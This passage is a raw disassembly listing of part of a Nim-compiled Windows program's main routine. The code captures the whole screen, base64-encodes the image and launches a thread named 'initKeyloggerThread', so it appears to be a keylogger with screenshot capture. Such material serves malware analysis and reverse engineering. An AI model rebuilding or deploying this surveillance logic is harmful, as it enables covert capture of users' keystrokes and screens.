  40632e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  406334:	45 31 c0             	xor    %r8d,%r8d
  406337:	48 89 fa             	mov    %rdi,%rdx
  40633a:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  406341:	00 
  406342:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
  406349:	00 
  40634a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40634f:	ff 15 eb 49 02 00    	call   *0x249eb(%rip)        # 42ad40 <Dl_33565001_>
  406355:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  40635c:	00 
  40635d:	ff 15 d5 49 02 00    	call   *0x249d5(%rip)        # 42ad38 <Dl_33290001_>
  406363:	b9 4c 00 00 00       	mov    $0x4c,%ecx
  406368:	ff 15 9a 49 02 00    	call   *0x2499a(%rip)        # 42ad08 <Dl_29815001_>
  40636e:	b9 4d 00 00 00       	mov    $0x4d,%ecx
  406373:	89 c7                	mov    %eax,%edi
  406375:	ff 15 8d 49 02 00    	call   *0x2498d(%rip)        # 42ad08 <Dl_29815001_>
  40637b:	b9 4e 00 00 00       	mov    $0x4e,%ecx
  406380:	41 89 c7             	mov    %eax,%r15d
  406383:	ff 15 7f 49 02 00    	call   *0x2497f(%rip)        # 42ad08 <Dl_29815001_>
  406389:	b9 4f 00 00 00       	mov    $0x4f,%ecx
  40638e:	41 89 c4             	mov    %eax,%r12d
  406391:	ff 15 71 49 02 00    	call   *0x24971(%rip)        # 42ad08 <Dl_29815001_>
  406397:	48 89 e9             	mov    %rbp,%rcx
  40639a:	ba 10 00 00 00       	mov    $0x10,%edx
  40639f:	41 29 fc             	sub    %edi,%r12d
  4063a2:	89 c6                	mov    %eax,%esi
  4063a4:	48 83 c5 08          	add    $0x8,%rbp
  4063a8:	e8 15 b6 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  4063ad:	44 29 fe             	sub    %r15d,%esi
  4063b0:	31 d2                	xor    %edx,%edx
  4063b2:	48 89 e9             	mov    %rbp,%rcx
  4063b5:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
  4063bc:	00 00 
  4063be:	89 f0                	mov    %esi,%eax
  4063c0:	c1 f8 1f             	sar    $0x1f,%eax
  4063c3:	31 c6                	xor    %eax,%esi
  4063c5:	29 c6                	sub    %eax,%esi
  4063c7:	44 89 e0             	mov    %r12d,%eax
  4063ca:	c1 f8 1f             	sar    $0x1f,%eax
  4063cd:	41 31 c4             	xor    %eax,%r12d
  4063d0:	41 29 c4             	sub    %eax,%r12d
  4063d3:	e8 ea ca ff ff       	call   402ec2 <unsureAsgnRef>
  4063d8:	89 74 24 64          	mov    %esi,0x64(%rsp)
  4063dc:	41 0f af f4          	imul   %r12d,%esi
  4063e0:	48 8d 0d d9 ee 01 00 	lea    0x1eed9(%rip),%rcx        # 4252c0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_>
  4063e7:	44 89 64 24 60       	mov    %r12d,0x60(%rsp)
  4063ec:	8d 14 b5 00 00 00 00 	lea    0x0(,%rsi,4),%edx
  4063f3:	48 63 d2             	movslq %edx,%rdx
  4063f6:	e8 dc f2 ff ff       	call   4056d7 <newSeq>
  4063fb:	48 89 e9             	mov    %rbp,%rcx
  4063fe:	48 89 c2             	mov    %rax,%rdx
  406401:	e8 bc ca ff ff       	call   402ec2 <unsureAsgnRef>
  406406:	31 c9                	xor    %ecx,%ecx
  406408:	ff 15 f2 48 02 00    	call   *0x248f2(%rip)        # 42ad00 <Dl_30180001_>
  40640e:	49 89 c4             	mov    %rax,%r12
  406411:	48 89 c1             	mov    %rax,%rcx
  406414:	ff 15 b6 48 02 00    	call   *0x248b6(%rip)        # 42acd0 <Dl_25975001_>
  40641a:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
  40641f:	4c 89 e1             	mov    %r12,%rcx
  406422:	48 89 c5             	mov    %rax,%rbp
  406425:	8b 54 24 60          	mov    0x60(%rsp),%edx
  406429:	ff 15 99 48 02 00    	call   *0x24899(%rip)        # 42acc8 <Dl_25965001_>
  40642f:	48 89 e9             	mov    %rbp,%rcx
  406432:	49 89 c5             	mov    %rax,%r13
  406435:	48 89 c2             	mov    %rax,%rdx
  406438:	ff 15 82 48 02 00    	call   *0x24882(%rip)        # 42acc0 <Dl_26815001_>
  40643e:	45 31 c0             	xor    %r8d,%r8d
  406441:	31 d2                	xor    %edx,%edx
  406443:	48 89 e9             	mov    %rbp,%rcx
  406446:	49 89 c6             	mov    %rax,%r14
  406449:	8b 44 24 64          	mov    0x64(%rsp),%eax
  40644d:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
  406452:	89 7c 24 30          	mov    %edi,0x30(%rsp)
  406456:	4c 8d 7c 24 70       	lea    0x70(%rsp),%r15
  40645b:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
  406460:	48 89 df             	mov    %rbx,%rdi
  406463:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
  40646a:	00 
  40646b:	4c 89 fe             	mov    %r15,%rsi
  40646e:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
  406473:	89 44 24 20          	mov    %eax,0x20(%rsp)
  406477:	ff 15 3b 48 02 00    	call   *0x2483b(%rip)        # 42acb8 <Dl_25910001_>
  40647d:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
  406482:	ba 2c 00 00 00       	mov    $0x2c,%edx
  406487:	4c 89 f9             	mov    %r15,%rcx
  40648a:	e8 33 b5 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  40648f:	ba 2c 00 00 00       	mov    $0x2c,%edx
  406494:	4c 89 f9             	mov    %r15,%rcx
  406497:	e8 26 b5 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  40649c:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  4064a1:	45 31 c0             	xor    %r8d,%r8d
  4064a4:	4c 89 fa             	mov    %r15,%rdx
  4064a7:	c7 44 24 70 28 00 00 	movl   $0x28,0x70(%rsp)
  4064ae:	00 
  4064af:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4064b4:	4c 89 4c 24 74       	mov    %r9,0x74(%rsp)
  4064b9:	48 c7 44 24 7c 01 00 	movq   $0x200001,0x7c(%rsp)
  4064c0:	20 00 
  4064c2:	48 c7 84 24 84 00 00 	movq   $0x0,0x84(%rsp)
  4064c9:	00 00 00 00 00 
  4064ce:	4c 8d 48 10          	lea    0x10(%rax),%r9
  4064d2:	48 c7 84 24 8c 00 00 	movq   $0x0,0x8c(%rsp)
  4064d9:	00 00 00 00 00 
  4064de:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  4064e5:	00 00 00 00 
  4064e9:	f3 a5                	rep movsl (%rsi),(%rdi)
  4064eb:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4064f0:	4c 89 ff             	mov    %r15,%rdi
  4064f3:	48 89 de             	mov    %rbx,%rsi
  4064f6:	f3 a5                	rep movsl (%rsi),(%rdi)
  4064f8:	48 89 e9             	mov    %rbp,%rcx
  4064fb:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  406502:	00 
  406503:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  40650a:	00 00 
  40650c:	ff 15 9e 47 02 00    	call   *0x2479e(%rip)        # 42acb0 <Dl_27160001_>
  406512:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406517:	45 31 c0             	xor    %r8d,%r8d
  40651a:	48 89 e9             	mov    %rbp,%rcx
  40651d:	44 8b 4c 24 64       	mov    0x64(%rsp),%r9d
  406522:	4c 89 ea             	mov    %r13,%rdx
  406525:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
  40652a:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  406531:	00 
  406532:	48 83 c0 10          	add    $0x10,%rax
  406536:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40653b:	ff 15 67 47 02 00    	call   *0x24767(%rip)        # 42aca8 <Dl_26365001_>
  406541:	4c 89 f2             	mov    %r14,%rdx
  406544:	48 89 e9             	mov    %rbp,%rcx
  406547:	ff 15 73 47 02 00    	call   *0x24773(%rip)        # 42acc0 <Dl_26815001_>
  40654d:	48 89 e9             	mov    %rbp,%rcx
  406550:	31 ed                	xor    %ebp,%ebp
  406552:	ff 15 48 47 02 00    	call   *0x24748(%rip)        # 42aca0 <Dl_26115001_>
  406558:	4c 89 e2             	mov    %r12,%rdx
  40655b:	31 c9                	xor    %ecx,%ecx
  40655d:	ff 15 95 47 02 00    	call   *0x24795(%rip)        # 42acf8 <Dl_30195001_>
  406563:	4c 89 e9             	mov    %r13,%rcx
  406566:	ff 15 2c 47 02 00    	call   *0x2472c(%rip)        # 42ac98 <Dl_26125001_>
  40656c:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
  406571:	ba 18 00 00 00       	mov    $0x18,%edx
  406576:	48 89 d9             	mov    %rbx,%rcx
  406579:	8b 7c 24 64          	mov    0x64(%rsp),%edi
  40657d:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
  406582:	e8 3b b4 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  406587:	49 63 c9             	movslq %r9d,%rcx
  40658a:	e8 20 dc ff ff       	call   4041af <nimIntToStr>
  40658f:	48 63 cf             	movslq %edi,%rcx
  406592:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  406599:	00 
  40659a:	e8 10 dc ff ff       	call   4041af <nimIntToStr>
  40659f:	48 85 f6             	test   %rsi,%rsi
  4065a2:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  4065a9:	00 
  4065aa:	74 03                	je     4065af <NimMainInner+0x672>
  4065ac:	48 8b 2e             	mov    (%rsi),%rbp
  4065af:	48 8d 45 02          	lea    0x2(%rbp),%rax
  4065b3:	b9 03 00 00 00       	mov    $0x3,%ecx
  4065b8:	48 8d 7e 10          	lea    0x10(%rsi),%rdi
  4065bc:	48 99                	cqto
  4065be:	48 f7 f9             	idiv   %rcx
  4065c1:	4c 8d 24 85 01 00 00 	lea    0x1(,%rax,4),%r12
  4065c8:	00 
  4065c9:	4c 89 e1             	mov    %r12,%rcx
  4065cc:	e8 7b d7 ff ff       	call   403d4c <rawNewString>
  4065d1:	4c 8d 5d fe          	lea    -0x2(%rbp),%r11
  4065d5:	45 31 c9             	xor    %r9d,%r9d
  4065d8:	31 d2                	xor    %edx,%edx
  4065da:	4c 89 20             	mov    %r12,(%rax)
  4065dd:	4c 8d 50 10          	lea    0x10(%rax),%r10
  4065e1:	4c 8d 05 18 af 00 00 	lea    0xaf18(%rip),%r8        # 411500 <TM__Dxxq7QTRlE6trHff5kPzzw_2>
  4065e8:	4d 39 cb             	cmp    %r9,%r11
  4065eb:	7f 0e                	jg     4065fb <NimMainInner+0x6be>
  4065ed:	4c 39 cd             	cmp    %r9,%rbp
  4065f0:	0f 8f 89 00 00 00    	jg     40667f <NimMainInner+0x742>
  4065f6:	e9 15 01 00 00       	jmp    406710 <NimMainInner+0x7d3>
  4065fb:	42 8a 4c 0e 10       	mov    0x10(%rsi,%r9,1),%cl
  406600:	c0 e9 02             	shr    $0x2,%cl
  406603:	83 e1 3f             	and    $0x3f,%ecx
  406606:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  40660d:	00 
  40660e:	88 4c 10 10          	mov    %cl,0x10(%rax,%rdx,1)
  406612:	42 8a 4c 0e 10       	mov    0x10(%rsi,%r9,1),%cl
  406617:	46 8a 64 0e 11       	mov    0x11(%rsi,%r9,1),%r12b
  40661c:	c1 e1 04             	shl    $0x4,%ecx
  40661f:	41 c0 ec 04          	shr    $0x4,%r12b
  406623:	83 e1 30             	and    $0x30,%ecx
  406626:	44 09 e1             	or     %r12d,%ecx
  406629:	83 e1 3f             	and    $0x3f,%ecx
  40662c:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406633:	00 
  406634:	88 4c 10 11          	mov    %cl,0x11(%rax,%rdx,1)
  406638:	42 8a 4c 0e 11       	mov    0x11(%rsi,%r9,1),%cl
  40663d:	46 8a 64 0e 12       	mov    0x12(%rsi,%r9,1),%r12b
  406642:	c1 e1 02             	shl    $0x2,%ecx
  406645:	83 e1 3c             	and    $0x3c,%ecx
  406648:	41 c0 ec 06          	shr    $0x6,%r12b
  40664c:	44 09 e1             	or     %r12d,%ecx
  40664f:	83 e1 3f             	and    $0x3f,%ecx
  406652:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406659:	00 
  40665a:	88 4c 10 12          	mov    %cl,0x12(%rax,%rdx,1)
  40665e:	42 8a 4c 0e 12       	mov    0x12(%rsi,%r9,1),%cl
  406663:	49 83 c1 03          	add    $0x3,%r9
  406667:	83 e1 3f             	and    $0x3f,%ecx
  40666a:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406671:	00 
  406672:	88 4c 10 13          	mov    %cl,0x13(%rax,%rdx,1)
  406676:	48 83 c2 04          	add    $0x4,%rdx
  40667a:	e9 69 ff ff ff       	jmp    4065e8 <NimMainInner+0x6ab>
  40667f:	4a 8d 34 0f          	lea    (%rdi,%r9,1),%rsi
  406683:	48 ff cd             	dec    %rbp
  406686:	44 8a 06             	mov    (%rsi),%r8b
  406689:	48 8d 0d 70 ae 00 00 	lea    0xae70(%rip),%rcx        # 411500 <TM__Dxxq7QTRlE6trHff5kPzzw_2>
  406690:	4d 8d 5c 12 01       	lea    0x1(%r10,%rdx,1),%r11
  406695:	4c 8d 52 02          	lea    0x2(%rdx),%r10
  406699:	41 c0 e8 02          	shr    $0x2,%r8b
  40669d:	41 83 e0 3f          	and    $0x3f,%r8d
  4066a1:	49 39 e9             	cmp    %rbp,%r9
  4066a4:	46 8a 84 01 80 00 00 	mov    0x80(%rcx,%r8,1),%r8b
  4066ab:	00 
  4066ac:	44 88 44 10 10       	mov    %r8b,0x10(%rax,%rdx,1)
  4066b1:	44 8a 06             	mov    (%rsi),%r8b
  4066b4:	74 44                	je     4066fa <NimMainInner+0x7bd>
  4066b6:	4a 8d 74 0f 01       	lea    0x1(%rdi,%r9,1),%rsi
  4066bb:	41 c1 e0 04          	shl    $0x4,%r8d
  4066bf:	48 83 c2 03          	add    $0x3,%rdx
  4066c3:	44 8a 0e             	mov    (%rsi),%r9b
  4066c6:	41 83 e0 30          	and    $0x30,%r8d
  4066ca:	41 c0 e9 04          	shr    $0x4,%r9b
  4066ce:	45 09 c8             	or     %r9d,%r8d
  4066d1:	41 83 e0 3f          	and    $0x3f,%r8d
  4066d5:	46 8a 84 01 80 00 00 	mov    0x80(%rcx,%r8,1),%r8b
  4066dc:	00 
  4066dd:	45 88 03             	mov    %r8b,(%r11)
  4066e0:	44 8a 06             	mov    (%rsi),%r8b
  4066e3:	41 c1 e0 02          	shl    $0x2,%r8d
  4066e7:	41 83 e0 3c          	and    $0x3c,%r8d
  4066eb:	42 8a 8c 01 80 00 00 	mov    0x80(%rcx,%r8,1),%cl
  4066f2:	00 
  4066f3:	42 88 4c 10 10       	mov    %cl,0x10(%rax,%r10,1)
  4066f8:	eb 16                	jmp    406710 <NimMainInner+0x7d3>
  4066fa:	41 c1 e0 04          	shl    $0x4,%r8d
  4066fe:	41 83 e0 30          	and    $0x30,%r8d
  406702:	42 8a 94 01 80 00 00 	mov    0x80(%rcx,%r8,1),%dl
  406709:	00 
  40670a:	41 88 13             	mov    %dl,(%r11)
  40670d:	4c 89 d2             	mov    %r10,%rdx
  406710:	48 89 c1             	mov    %rax,%rcx
  406713:	e8 ec d9 ff ff       	call   404104 <setLengthStr>
  406718:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
  40671f:	00 
  406720:	31 c9                	xor    %ecx,%ecx
  406722:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
  406729:	00 
  40672a:	48 85 d2             	test   %rdx,%rdx
  40672d:	74 03                	je     406732 <NimMainInner+0x7f5>
  40672f:	48 8b 0a             	mov    (%rdx),%rcx
  406732:	4c 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%r8
  406739:	00 
  40673a:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  40673e:	31 c9                	xor    %ecx,%ecx
  406740:	4d 85 c0             	test   %r8,%r8
  406743:	74 03                	je     406748 <NimMainInner+0x80b>
  406745:	49 8b 08             	mov    (%r8),%rcx
  406748:	48 01 d1             	add    %rdx,%rcx
  40674b:	31 d2                	xor    %edx,%edx
  40674d:	48 85 c0             	test   %rax,%rax
  406750:	74 03                	je     406755 <NimMainInner+0x818>
  406752:	48 8b 10             	mov    (%rax),%rdx
  406755:	48 01 d1             	add    %rdx,%rcx
  406758:	e8 ef d5 ff ff       	call   403d4c <rawNewString>
  40675d:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
  406764:	00 
  406765:	31 d2                	xor    %edx,%edx
  406767:	4d 85 c0             	test   %r8,%r8
  40676a:	74 03                	je     40676f <NimMainInner+0x832>
  40676c:	49 8b 10             	mov    (%r8),%rdx
  40676f:	48 89 c1             	mov    %rax,%rcx
  406772:	e8 30 de ff ff       	call   4045a7 <resizeString>
  406777:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
  40677e:	00 
  40677f:	48 89 c1             	mov    %rax,%rcx
  406782:	49 89 c1             	mov    %rax,%r9
  406785:	e8 19 b2 ff ff       	call   4019a3 <appendString.lto_priv.49>
  40678a:	ba 01 00 00 00       	mov    $0x1,%edx
  40678f:	4c 89 c9             	mov    %r9,%rcx
  406792:	e8 10 de ff ff       	call   4045a7 <resizeString>
  406797:	48 8d 15 22 ae 00 00 	lea    0xae22(%rip),%rdx        # 4115c0 <TM__fVqOpnb3Z6qf9aEcYGlvseQ_2>
  40679e:	48 89 c1             	mov    %rax,%rcx
  4067a1:	49 89 c1             	mov    %rax,%r9
  4067a4:	e8 d4 b1 ff ff       	call   40197d <appendString.part.0>
  4067a9:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
  4067b0:	00 
  4067b1:	31 d2                	xor    %edx,%edx
  4067b3:	48 85 c0             	test   %rax,%rax
  4067b6:	74 03                	je     4067bb <NimMainInner+0x87e>
  4067b8:	48 8b 10             	mov    (%rax),%rdx
  4067bb:	4c 89 c9             	mov    %r9,%rcx
  4067be:	e8 e4 dd ff ff       	call   4045a7 <resizeString>
  4067c3:	48 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%rdx
  4067ca:	00 
  4067cb:	48 89 c1             	mov    %rax,%rcx
  4067ce:	49 89 c1             	mov    %rax,%r9
  4067d1:	e8 cd b1 ff ff       	call   4019a3 <appendString.lto_priv.49>
  4067d6:	ba 01 00 00 00       	mov    $0x1,%edx
  4067db:	4c 89 c9             	mov    %r9,%rcx
  4067de:	e8 c4 dd ff ff       	call   4045a7 <resizeString>
  4067e3:	48 8d 15 d6 ad 00 00 	lea    0xadd6(%rip),%rdx        # 4115c0 <TM__fVqOpnb3Z6qf9aEcYGlvseQ_2>
  4067ea:	48 89 c1             	mov    %rax,%rcx
  4067ed:	49 89 c1             	mov    %rax,%r9
  4067f0:	e8 88 b1 ff ff       	call   40197d <appendString.part.0>
  4067f5:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
  4067fc:	00 
  4067fd:	31 d2                	xor    %edx,%edx
  4067ff:	48 85 c0             	test   %rax,%rax
  406802:	74 03                	je     406807 <NimMainInner+0x8ca>
  406804:	48 8b 10             	mov    (%rax),%rdx
  406807:	4c 89 c9             	mov    %r9,%rcx
  40680a:	e8 98 dd ff ff       	call   4045a7 <resizeString>
  40680f:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
  406816:	00 
  406817:	48 89 c1             	mov    %rax,%rcx
  40681a:	49 89 c1             	mov    %rax,%r9
  40681d:	e8 81 b1 ff ff       	call   4019a3 <appendString.lto_priv.49>
  406822:	48 8d 0d 2f e8 01 00 	lea    0x1e82f(%rip),%rcx        # 425058 <base64Ss__oiZt3HUh4E3gRrnK1to7IQ>
  406829:	4c 89 ca             	mov    %r9,%rdx
  40682c:	e8 cf c6 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  406831:	48 8d 0d 38 46 02 00 	lea    0x24638(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  406838:	ff 15 76 1a 04 00    	call   *0x41a76(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  40683e:	45 31 c9             	xor    %r9d,%r9d
  406841:	45 31 c0             	xor    %r8d,%r8d
  406844:	31 d2                	xor    %edx,%edx
  406846:	31 c9                	xor    %ecx,%ecx
  406848:	ff 15 aa e8 01 00    	call   *0x1e8aa(%rip)        # 4250f8 <Dl_1285026_>
  40684e:	48 8d 0d 6b 33 02 00 	lea    0x2336b(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406855:	48 c7 05 f8 45 02 00 	movq   $0xffffffffffffffff,0x245f8(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  40685c:	ff ff ff ff 
  406860:	4c 8b 3d 05 1a 04 00 	mov    0x41a05(%rip),%r15        # 44826c <__imp_EnterCriticalSection>
  406867:	48 89 05 2a 46 02 00 	mov    %rax,0x2462a(%rip)        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  40686e:	48 c7 05 e7 45 02 00 	movq   $0x0,0x245e7(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  406875:	00 00 00 00 
  406879:	41 ff d7             	call   *%r15
  40687c:	48 8d 0d 7d b4 01 00 	lea    0x1b47d(%rip),%rcx        # 421d00 <sharedHeap__R3bhvQCN0d6AYpkvxfT9aGw>
  406883:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  406888:	e8 99 c2 ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  40688d:	48 8d 0d 2c 33 02 00 	lea    0x2332c(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406894:	48 8b 2d 21 1a 04 00 	mov    0x41a21(%rip),%rbp        # 4482bc <__imp_LeaveCriticalSection>
  40689b:	48 89 c6             	mov    %rax,%rsi
  40689e:	ff d5                	call   *%rbp
  4068a0:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  4068a5:	48 89 f1             	mov    %rsi,%rcx
  4068a8:	e8 15 b1 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  4068ad:	48 8d 05 1e b1 ff ff 	lea    -0x4ee2(%rip),%rax        # 4019d2 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw>
  4068b4:	31 c9                	xor    %ecx,%ecx
  4068b6:	48 89 35 83 e7 01 00 	mov    %rsi,0x1e783(%rip)        # 425040 <thr__6OCkUFmrNoAXK9buHED9cuYQ>
  4068bd:	48 89 05 8c e7 01 00 	mov    %rax,0x1e78c(%rip)        # 425050 <thr__6OCkUFmrNoAXK9buHED9cuYQ+0x10>
  4068c4:	4c 8d 0d 75 e7 01 00 	lea    0x1e775(%rip),%r9        # 425040 <thr__6OCkUFmrNoAXK9buHED9cuYQ>
  4068cb:	ba 00 f0 1f 00       	mov    $0x1ff000,%edx
  4068d0:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
  4068d5:	4c 8d 05 12 05 00 00 	lea    0x512(%rip),%r8        # 406dee <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA>
  4068dc:	c7 84 24 a0 00 00 00 	movl   $0x0,0xa0(%rsp)
  4068e3:	00 00 00 00 
  4068e7:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  4068ee:	00 
  4068ef:	ff 15 fb e7 01 00    	call   *0x1e7fb(%rip)        # 4250f0 <Dl_1285210_>
  4068f5:	48 85 c0             	test   %rax,%rax
  4068f8:	48 89 05 49 e7 01 00 	mov    %rax,0x1e749(%rip)        # 425048 <thr__6OCkUFmrNoAXK9buHED9cuYQ+0x8>
  4068ff:	7f 7b                	jg     40697c <NimMainInner+0xa3f>
  406901:	48 8d 0d 38 e9 01 00 	lea    0x1e938(%rip),%rcx        # 425240 <NTI__M8bPR1OE5OXPYGyQdVHfTg_>
  406908:	ba 30 00 00 00       	mov    $0x30,%edx
  40690d:	e8 d4 d3 ff ff       	call   403ce6 <newObj>
  406912:	48 8d 0d c7 ac 00 00 	lea    0xacc7(%rip),%rcx        # 4115e0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_39>
  406919:	48 89 c6             	mov    %rax,%rsi
  40691c:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
  406920:	48 8d 05 59 e9 01 00 	lea    0x1e959(%rip),%rax        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  406927:	48 89 06             	mov    %rax,(%rsi)
  40692a:	48 8d 05 21 59 00 00 	lea    0x5921(%rip),%rax        # 40c252 <.rdata+0x252>
  406931:	48 89 46 10          	mov    %rax,0x10(%rsi)
  406935:	e8 06 d3 ff ff       	call   403c40 <copyStringRC1>
  40693a:	48 85 ff             	test   %rdi,%rdi
  40693d:	48 89 46 18          	mov    %rax,0x18(%rsi)
  406941:	74 08                	je     40694b <NimMainInner+0xa0e>
  406943:	48 89 f9             	mov    %rdi,%rcx
  406946:	e8 e6 c5 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  40694b:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  40694f:	31 d2                	xor    %edx,%edx
  406951:	e8 aa c5 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  406956:	4c 8d 0d 0c 59 00 00 	lea    0x590c(%rip),%r9        # 40c269 <.rdata+0x269>
  40695d:	48 89 f1             	mov    %rsi,%rcx
  406960:	48 c7 44 24 20 0b 01 	movq   $0x10b,0x20(%rsp)
  406967:	00 00 
  406969:	4c 8d 05 05 59 00 00 	lea    0x5905(%rip),%r8        # 40c275 <.rdata+0x275>
  406970:	48 8d 15 db 58 00 00 	lea    0x58db(%rip),%rdx        # 40c252 <.rdata+0x252>
  406977:	e8 3c e9 ff ff       	call   4052b8 <raiseExceptionEx>
  40697c:	4c 8d 2d 7d 44 02 00 	lea    0x2447d(%rip),%r13        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  406983:	b9 0a 00 00 00       	mov    $0xa,%ecx
  406988:	ff 15 5a 32 02 00    	call   *0x2325a(%rip)        # 429be8 <Dl_14037864_>
  40698e:	31 d2                	xor    %edx,%edx
  406990:	c6 05 99 e6 01 00 00 	movb   $0x0,0x1e699(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  406997:	48 8d 0d 9a e6 01 00 	lea    0x1e69a(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  40699e:	e8 1f c5 ff ff       	call   402ec2 <unsureAsgnRef>
  4069a3:	31 d2                	xor    %edx,%edx
  4069a5:	c6 05 84 e6 01 00 00 	movb   $0x0,0x1e684(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  4069ac:	48 8d 0d 85 e6 01 00 	lea    0x1e685(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  4069b3:	e8 0a c5 ff ff       	call   402ec2 <unsureAsgnRef>
  4069b8:	48 83 3d 98 44 02 00 	cmpq   $0xfffffffffffffffe,0x24498(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  4069bf:	fe 
  4069c0:	0f 84 53 01 00 00    	je     406b19 <NimMainInner+0xbdc>
  4069c6:	48 8d 0d a3 44 02 00 	lea    0x244a3(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  4069cd:	ff 15 59 19 04 00    	call   *0x41959(%rip)        # 44832c <__imp_TryEnterCriticalSection>
  4069d3:	85 c0                	test   %eax,%eax
  4069d5:	0f 84 3e 01 00 00    	je     406b19 <NimMainInner+0xbdc>
  4069db:	48 83 3d 6d 44 02 00 	cmpq   $0x0,0x2446d(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  4069e2:	00 
  4069e3:	0f 8e 27 01 00 00    	jle    406b10 <NimMainInner+0xbd3>
  4069e9:	c6 05 b8 44 02 00 01 	movb   $0x1,0x244b8(%rip)        # 42aea8 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x68>
  4069f0:	48 8b 05 59 44 02 00 	mov    0x24459(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  4069f7:	48 85 c0             	test   %rax,%rax
  4069fa:	7e 12                	jle    406a0e <NimMainInner+0xad1>
  4069fc:	4c 39 2d 9d 44 02 00 	cmp    %r13,0x2449d(%rip)        # 42aea0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x60>
  406a03:	c6 05 9e 44 02 00 00 	movb   $0x0,0x2449e(%rip)        # 42aea8 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x68>
  406a0a:	74 10                	je     406a1c <NimMainInner+0xadf>
  406a0c:	eb 69                	jmp    406a77 <NimMainInner+0xb3a>
  406a0e:	48 8d 0d 83 44 02 00 	lea    0x24483(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  406a15:	e8 2f af ff ff       	call   401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.25>
